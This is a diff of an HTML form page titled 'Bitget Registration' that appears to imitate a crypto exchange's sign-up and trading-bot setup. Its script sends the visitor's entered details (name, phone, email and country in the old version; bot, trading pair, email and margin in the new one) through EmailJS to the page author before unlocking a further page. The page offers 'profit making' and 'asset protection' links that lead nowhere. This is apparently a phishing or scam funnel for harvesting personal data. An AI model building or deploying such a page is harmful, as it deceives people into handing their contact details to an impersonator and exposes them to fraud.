@@ -1,166 +1,1073 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bitget Registration</title>
-  <link rel="stylesheet" href="style.css">
-  <!-- EMAILJS SDK -->
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-</head>
-<body>
-  <div class="card">
-    <div class="info-box">
-      <p>how we protect your asset:</p>
-      <a href="About.Html">Asset protection</a>
-      <p>how we generate profit:</p>
-      <a href="Profit.Html">profit making</a>
-      <p>legal compliance:</p>
-      <a href="Policy.Html">regulation</a>
-      <h2>Please fill in the form below<br>to proceed</h2>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>Bitget Registration</title>  <link rel="stylesheet" href="Style.css">  <!-- EMAILJS SDK -->  <script
+    type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>  <style>
+
+    /* ==============================
+       CUSTOM EMPTY FORM ALERT
+       ============================== */
+
+    .custom-alert {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.45);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    #ground {
+      background-color: black;
+    }
+
+    .custom-alert.show {
+      display: flex;
+    }
+
+    .alert-box {
+      width: 85%;
+      max-width: 350px;
+      background: darkgray;
+      border-radius: 15px;
+      padding: 25px 20px 20px;
+      text-align: center;
+      box-sizing: border-box;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
+    }
+
+    .alert-box p {
+      margin: 0 0 25px;
+      font-size: 16px;
+      color: darkred;
+    }
+
+    .label {
+      color: white;
+    }
+
+    .alert-box button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #000000;
+      color: #ffffff;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    .alert-box button:active {
+      transform: scale(0.98);
+    }
+
+
+    /* ==============================
+       CUSTOM DROPDOWN
+       ============================== */
+
+    .custom-dropdown {
+      position: relative;
+      width: 100%;
+    }
+
+    .custom-dropdown input {
+      width: 100%;
+      padding-right: 45px;
+      cursor: pointer;
+    }
+
+
+    /* ==============================
+       DROPDOWN ARROW
+       ============================== */
+
+    .dropdown-arrow {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+
+      transform: translateY(-50%);
+
+      /* DARK GREY ARROW */
+      color: #555555;
+
+      font-size: 15px;
+
+      pointer-events: none;
+
+      transition: transform 0.2s ease;
+
+      z-index: 2;
+    }
+
+    .custom-dropdown.open .dropdown-arrow {
+      transform:
+        translateY(-50%)
+        rotate(180deg);
+    }
+
+
+    /* ==============================
+       DROPDOWN LIST CONTAINER
+       ============================== */
+
+    .dropdown-list {
+      display: none;
+
+      position: absolute;
+
+      left: 0;
+
+      /* HALF OF INPUT WIDTH */
+      width: 50%;
+
+      right: auto;
+
+      top: calc(100% + 4px);
+
+      /* DARK GREEN */
+      background-color: #164d3b;
+
+      /* WHITE FONT */
+      color: white;
+
+      border-radius: 8px;
+
+      overflow-y: auto;
+
+      /* HALF-HEIGHT / SCROLLABLE */
+      max-height: 150px;
+
+      z-index: 10000;
+
+      box-shadow:
+        0 5px 15px
+        rgba(0, 0, 0, 0.35);
+    }
+
+
+    /* SHOW DROPDOWN */
+
+    .custom-dropdown.open .dropdown-list {
+      display: block;
+    }
+
+
+    /* ==============================
+       DROPDOWN OPTIONS
+       ============================== */
+
+    .dropdown-option {
+
+      /* REDUCED SIZE */
+      padding: 9px 10px;
+
+      color: white;
+
+      /* REDUCED FONT SIZE */
+      font-size: 12px;
+
+      cursor: pointer;
+
+      border-bottom:
+        1px solid
+        rgba(255, 255, 255, 0.08);
+
+      white-space: nowrap;
+    }
+
+
+    .dropdown-option:last-child {
+      border-bottom: none;
+    }
+
+
+    .dropdown-option:hover {
+      background-color: #1d624b;
+    }
+
+
+    .dropdown-option:active {
+      background-color: #24765a;
+    }
+
+
+    /* ==============================
+       PAIR DROPDOWN
+       ============================== */
+
+    #pairDropdown .dropdown-option {
+      text-transform: uppercase;
+    }
+
+  </style></head><body id="ground">  <div class="card" id="ok"><div class="info-box" id="small">
+
+  <p>how trading bots works :</p><br>
+  <a href="#">explore automated trading</a>
+
+ <p>protection of assets:</p><br>
+  <a href="#">Asset protection </a>
+
+ <p>Risk management protocol:</p><br>
+  <a href="#">risk management </a>
+
+</div>
+
+
+<form id="secondPageForm" novalidate>
+
+
+  <!-- ==============================
+       BOT DROPDOWN
+       ============================== -->
+
+  <label for="name" class="label">
+    Select bot:
+  </label>
+
+  <span
+    class="error"
+    id="nameError">
+  </span>
+
+
+  <div
+    class="custom-dropdown"
+    id="botDropdown">
+
+    <input
+      type="text"
+      id="name"
+      name="name"
+      placeholder="  Bot"
+      readonly
+    >
+
+    <span class="dropdown-arrow">
+      ▼
+    </span>
+
+
+    <div class="dropdown-list">
+
+      <div class="dropdown-option">
+        Spot grid Bot
+      </div>
+
+      <div class="dropdown-option">
+        Futures grid Bot
+      </div>
+
+      <div class="dropdown-option">
+        Spot position Bot
+      </div>
+
+      <div class="dropdown-option">
+        Future position Bot 
+      </div>
+
+      <div class="dropdown-option">
+        Spot martingale Bot
+      </div>
+
     </div>
 
-    <form id="secondPageForm">
-      <label for="name">Name:</label>
-      <span class ="error" id="nameError"></span>
-      <input type="text" id="name" name="name" placeholder="Name" >
-
-      <label for="phone">Phone:</label>
-      <span class="error" id ="phoneError"></span>
-      <input type="tel" id="phone" name="phone" placeholder="Phone" >
-
-      <label for="email">Email:</label>
-      <span class ="error" id ="emailError"></span>
-      <input type="email" id="email" name="email" placeholder="Email" >
-
-      <label for="country">Country:</label>
-      <span class ="error" id ="countryError"></span>
-      <input type="text" id="country" name="country" placeholder="country" >
-
-      <button type="submit" class="btn-submit">Submit</button>
-
-      <div class="btn-row">
-        <button type="button" class="btn-next" id="nextBtn" disabled onclick="window.location.href='page3.html'">Next</button>
-      </div>
-    </form>
   </div>
-  
-  <script>
-    // YOUR PUBLIC KEY
-    (function(){
-      emailjs.init("trKd_qkfAMWqGxcTW"); 
+
+
+
+  <!-- ==============================
+       TRADING PAIR DROPDOWN
+       ============================== -->
+
+  <label for="phone" class="label">
+    Pair :
+  </label>
+
+  <span
+    class="error"
+    id="phoneError">
+  </span>
+
+
+  <div
+    class="custom-dropdown"
+    id="pairDropdown">
+
+    <input
+      type="text"
+      id="phone"
+      name="phone"
+      placeholder="  trading pair"
+      readonly
+    >
+
+    <span class="dropdown-arrow">
+      ▼
+    </span>
+
+
+    <div class="dropdown-list">
+
+      <div class="dropdown-option">
+        BTC/USDT
+      </div>
+
+      <div class="dropdown-option">
+        ETH/USDT
+      </div>
+
+      <div class="dropdown-option">
+        SOL/USDT
+      </div>
+
+      <div class="dropdown-option">
+        XRP/USDT
+      </div>
+
+      <div class="dropdown-optihon">
+        DOGE/USDT
+      </div>
+
+      <div class="dropdown-option">
+        BNB/USDT
+      </div>
+
+      <div class="dropdown-option">
+        ADA/USDT
+      </div>
+
+      <div class="dropdown-option">
+        AVAX/USDT
+      </div>
+
+      <div class="dropdown-option">
+        LINK/USDT
+      </div>
+
+      <div class="dropdown-option">
+        TRX/USDT
+      </div>
+
+    </div>
+
+  </div>
+
+
+
+  <!-- ==============================
+       EMAIL
+       THIRD INPUT - UNCHANGED
+       ============================== -->
+
+  <label for="email" class="label">
+    Email:
+  </label>
+
+  <span
+    class="error"
+    id="emailError">
+  </span>
+
+
+  <input
+    type="email"
+    id="email"
+    name="email"
+    placeholder="Email"
+  >
+
+
+
+  <!-- ==============================
+       MARGIN DROPDOWN
+       ============================== -->
+
+  <label for="country" class="label">
+    margin :
+  </label>
+
+  <span
+    class="error"
+    id="countryError">
+  </span>
+
+
+  <div
+    class="custom-dropdown"
+    id="marginDropdown">
+
+    <input
+      type="text"
+      id="country"
+      name="country"
+      placeholder="  margin"
+      readonly
+    >
+
+    <span class="dropdown-arrow">
+      ▼
+    </span>
+
+
+    <div class="dropdown-list">
+
+      <div class="dropdown-option">
+        Isolated margin
+      </div>
+
+      <div class="dropdown-option">
+        Cross margin
+      </div>
+
+    </div>
+
+  </div>
+
+
+
+  <!-- ==============================
+       SUBMIT BUTTON
+       ============================== -->
+
+  <button
+    type="submit"
+    class="btn-submit">
+
+    Submit
+
+  </button>
+
+
+  <!-- ==============================
+       NEXT BUTTON
+       ============================== -->
+
+  <div class="btn-row">
+
+    <button
+      type="button"
+      class="btn-next"
+      id="nextBtn"
+      disabled>
+
+      Next
+
+    </button>
+
+  </div>
+
+
+</form>
+
+  </div>  <!-- ==============================
+       CUSTOM EMPTY FORM ALERT
+       ============================== -->  <div
+    id="emptyFormAlert"
+    class="custom-alert"><div class="alert-box">
+
+  <p>
+     initiate bot setup to proceed 
+  </p>
+
+  <button
+    type="button"
+    id="alertOkBtn">
+
+    OK
+
+  </button>
+
+</div>
+
+  </div>  <script>
+
+    /* ==============================
+       EMAILJS INITIALIZATION
+       ============================== */
+
+    (function () {
+
+      emailjs.init(
+        "trKd_qkfAMWqGxcTW"
+      );
+
     })();
 
-    document.addEventListener('DOMContentLoaded', function() {
-      const form = document.getElementById('secondPageForm');
-      const btn = document.getElementById('nextBtn');
-      const submitBtn = form.querySelector('.btn-submit');
-      const inputs = Array.from(form.querySelectorAll('input'));
-      
-      let canProceed = false;
 
-      btn.disabled = true;
 
-      function clearErrors() {
-        document.querySelectorAll('.error').forEach(span => {
-          span.textContent = '';
-          span.classList.remove('show');
-        });
-      }
+    document.addEventListener(
+      'DOMContentLoaded',
+      function () {
 
-      function showError(span, message) {
-        span.textContent = message;
-        setTimeout(() => {
-          span.classList.add('show');
-        }, 10);
-      }
 
-      function getFirstError() {
-        for (let input of inputs) {
-          const errorSpan = document.getElementById(input.id + 'Error');
-          const placeholder = input.placeholder;
-          const value = input.value.trim();
+        /* ==============================
+           FORM ELEMENTS
+           ============================== */
 
-          if (value === '') {
-            return { message: `pls enter your ${placeholder} `, span: errorSpan };
+        const form =
+          document.getElementById(
+            'secondPageForm'
+          );
+
+        const btn =
+          document.getElementById(
+            'nextBtn'
+          );
+
+        const submitBtn =
+          form.querySelector(
+            '.btn-submit'
+          );
+
+        const inputs =
+          Array.from(
+            form.querySelectorAll('input')
+          );
+
+
+
+        /* ==============================
+           CUSTOM ALERT
+           ============================== */
+
+        const emptyFormAlert =
+          document.getElementById(
+            'emptyFormAlert'
+          );
+
+        const alertOkBtn =
+          document.getElementById(
+            'alertOkBtn'
+          );
+
+
+        alertOkBtn.addEventListener(
+          'click',
+          function () {
+
+            emptyFormAlert.classList.remove(
+              'show'
+            );
+
           }
-          
-          if (input.id === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
-            return { message: `pls enter a valid ${placeholder} `, span: errorSpan };
+        );
+
+
+
+        /* ==============================
+           DROPDOWN SYSTEM
+           ============================== */
+
+        const dropdowns =
+          document.querySelectorAll(
+            '.custom-dropdown'
+          );
+
+
+        dropdowns.forEach(
+          function (dropdown) {
+
+            const input =
+              dropdown.querySelector(
+                'input'
+              );
+
+
+            const options =
+              dropdown.querySelectorAll(
+                '.dropdown-option'
+              );
+
+
+            /* ==============================
+               OPEN / CLOSE DROPDOWN
+               ============================== */
+
+            input.addEventListener(
+              'click',
+              function (event) {
+
+                event.stopPropagation();
+
+
+                /* Close other dropdowns */
+
+                dropdowns.forEach(
+                  function (otherDropdown) {
+
+                    if (
+                      otherDropdown !== dropdown
+                    ) {
+
+                      otherDropdown.classList.remove(
+                        'open'
+                      );
+
+                    }
+
+                  }
+                );
+
+
+                dropdown.classList.toggle(
+                  'open'
+                );
+
+              }
+            );
+
+
+
+            /* ==============================
+               SELECT OPTION
+               ============================== */
+
+            options.forEach(
+              function (option) {
+
+                option.addEventListener(
+                  'click',
+                  function (event) {
+
+                    event.stopPropagation();
+
+
+                    /* Put selected option
+                       inside input */
+
+                    input.value =
+                      option.textContent.trim();
+
+
+                    /* Close dropdown */
+
+                    dropdown.classList.remove(
+                      'open'
+                    );
+
+
+                    /* Trigger existing
+                       input validation */
+
+                    input.dispatchEvent(
+                      new Event(
+                        'input',
+                        {
+                          bubbles: true
+                        }
+                      )
+                    );
+
+                  }
+                );
+
+              }
+            );
+
+          }
+        );
+
+
+
+        /* ==============================
+           CLOSE DROPDOWN WHEN CLICKING
+           OUTSIDE
+           ============================== */
+
+        document.addEventListener(
+          'click',
+          function () {
+
+            dropdowns.forEach(
+              function (dropdown) {
+
+                dropdown.classList.remove(
+                  'open'
+                );
+
+              }
+            );
+
+          }
+        );
+
+
+
+        /* ==============================
+           FORM CONTROL
+           ============================== */
+
+        let canProceed = false;
+
+        btn.disabled = true;
+
+
+
+        /* ==============================
+           CLEAR ERRORS
+           ============================== */
+
+        function clearErrors() {
+
+          document
+            .querySelectorAll('.error')
+            .forEach(
+              function (span) {
+
+                span.textContent = '';
+
+                span.classList.remove(
+                  'show'
+                );
+
+              }
+            );
+
+        }
+
+
+
+        /* ==============================
+           SHOW ERROR
+           ============================== */
+
+        function showError(
+          span,
+          message
+        ) {
+
+          span.textContent =
+            message;
+
+          setTimeout(
+            function () {
+
+              span.classList.add(
+                'show'
+              );
+
+            },
+            10
+          );
+
+        }
+
+
+
+        /* ==============================
+           GET FIRST ERROR
+           ============================== */
+
+        function getFirstError() {
+
+          for (
+            let input of inputs
+          ) {
+
+            const errorSpan =
+              document.getElementById(
+                input.id + 'Error'
+              );
+
+            const placeholder =
+              input.placeholder;
+
+            const value =
+              input.value.trim();
+
+
+            /* Empty input */
+
+            if (value === '') {
+
+              return {
+
+                message:
+                  `enter ${placeholder} `,
+
+                span:
+                  errorSpan
+
+              };
+
+            }
+
+
+            /* Email validation */
+
+            if (
+              input.id === 'email' &&
+              !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(
+                value
+              )
+            ) {
+
+              return {
+
+                message:
+                  'email is invalid',
+
+                span:
+                  errorSpan
+
+              };
+
+            }
+
+
+            /* Pair validation */
+
+            if (
+              input.id === 'phone' &&
+              !/^[A-Za-z0-9/]+$/.test(
+                value
+              )
+            ) {
+
+              return {
+
+                message:
+                  `pls enter a valid ${placeholder} `,
+
+                span:
+                  errorSpan
+
+              };
+
+            }
+
           }
 
-          if (input.id === 'phone' && !/^[0-9+\-\s()]{8,15}$/.test(value)) {
-            return { message: `pls enter a valid ${placeholder} `, span: errorSpan };
-          }
+
+          return null;
+
         }
-        return null;
+
+
+
+        /* ==============================
+           INPUT EVENTS
+           ============================== */
+
+        inputs.forEach(
+          function (input) {
+
+            input.addEventListener(
+              'input',
+              function () {
+
+                canProceed = false;
+
+                btn.disabled = true;
+
+                btn.textContent =
+                  "Next";
+
+                submitBtn.disabled =
+                  false;
+
+                submitBtn.textContent =
+                  "Submit";
+
+                clearErrors();
+
+              }
+            );
+
+          }
+        );
+
+
+
+        /* ==============================
+           FORM SUBMISSION
+           ============================== */
+
+        form.addEventListener(
+          'submit',
+          function (e) {
+
+            e.preventDefault();
+
+
+            const allEmpty =
+              inputs.every(
+                function (input) {
+
+                  return (
+                    input.value.trim() === ''
+                  );
+
+                }
+              );
+
+
+            /* EMPTY FORM */
+
+            if (allEmpty) {
+
+              emptyFormAlert.classList.add(
+                'show'
+              );
+
+              return;
+
+            }
+
+
+            clearErrors();
+
+
+            const firstError =
+              getFirstError();
+
+
+            if (firstError) {
+
+              showError(
+                firstError.span,
+                firstError.message
+              );
+
+              canProceed = false;
+
+              btn.disabled = true;
+
+            }
+
+
+            else {
+
+
+              /* ==============================
+                 VALIDATION PASSED
+                 SEND EMAIL
+                 ============================== */
+
+              submitBtn.disabled = true;
+
+              submitBtn.textContent =
+                "Sending...";
+
+
+              const templateParams = {
+
+                name:
+                  document.getElementById(
+                    'name'
+                  ).value,
+
+                phone:
+                  document.getElementById(
+                    'phone'
+                  ).value,
+
+                email:
+                  document.getElementById(
+                    'email'
+                  ).value,
+
+                country:
+                  document.getElementById(
+                    'country'
+                  ).value
+
+              };
+
+
+              emailjs.send(
+
+                "service_yx1rj2j",
+
+                "template_qz0audi",
+
+                templateParams
+
+              )
+
+
+              .then(
+                function (response) {
+
+                  console.log(
+                    'SUCCESS!',
+                    response.status
+                  );
+
+
+                  canProceed = true;
+
+                  btn.disabled = false;
+
+                  btn.textContent =
+                    "Next →";
+
+                  submitBtn.textContent =
+                    "Submitted ✓";
+
+                }
+              )
+
+
+              .catch(
+                function (error) {
+
+                  console.log(
+                    'FAILED...',
+                    error
+                  );
+
+
+                  alert(
+                    "Failed to send. Please check your internet and try again."
+                  );
+
+
+                  submitBtn.disabled =
+                    false;
+
+                  submitBtn.textContent =
+                    "Submit";
+
+                }
+              );
+
+            }
+
+          }
+        );
+
+
+
+        /* ==============================
+           NEXT PAGE
+           ============================== */
+
+        btn.addEventListener(
+          'click',
+          function () {
+
+            if (canProceed) {
+
+              window.location.href =
+                "page3.html";
+
+            }
+
+          }
+        );
+
+
       }
+    );
 
-      inputs.forEach(input => {
-        input.addEventListener('input', () => {
-          canProceed = false;
-          btn.disabled = true;
-          btn.textContent = "Next";
-          submitBtn.disabled = false;
-          submitBtn.textContent = "Submit";
-          clearErrors();
-        });
-      });
-
-      // WHEN SUBMIT IS CLICKED -> VALIDATE -> SEND EMAIL -> UNLOCK NEXT
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const allEmpty = inputs.every(input => input.value.trim() === '');
-        if (allEmpty) {
-          alert("pls fill out the required form to proceed");
-          return;
-        }
-
-        clearErrors();
-        const firstError = getFirstError();
-
-        if (firstError) {
-          showError(firstError.span, firstError.message);
-          canProceed = false;
-          btn.disabled = true;
-        } else {
-          // Validation passed. Send to your email now
-          submitBtn.disabled = true;
-          submitBtn.textContent = "Sending...";
-
-          const templateParams = {
-            name: document.getElementById('name').value,
-            phone: document.getElementById('phone').value,
-            email: document.getElementById('email').value,
-            country: document.getElementById('country').value
-          };
-
-          emailjs.send("service_yx1rj2j", "template_qz0audi", templateParams)
-          .then(function(response) {
-             console.log('SUCCESS!', response.status);
-             alert("Submitted! Check your email.");
-             canProceed = true;
-             btn.disabled = false;
-             btn.textContent = "Next →";
-             submitBtn.textContent = "Submitted ✓";
-          }, function(error) {
-             console.log('FAILED...', error);
-             alert("Failed to send. Please check your internet and try again.");
-             submitBtn.disabled = false;
-             submitBtn.textContent = "Submit";
-          });
-        }
-      });
-
-      // GO TO NEXT PAGE ONLY AFTER EMAIL SENT
-      btn.addEventListener('click', function() {
-        if (canProceed) {
-          window.location.href = "page3.html";
-        }
-      });
-
-    });
-  </script>
-</body>
+  </script></body>
 </html>
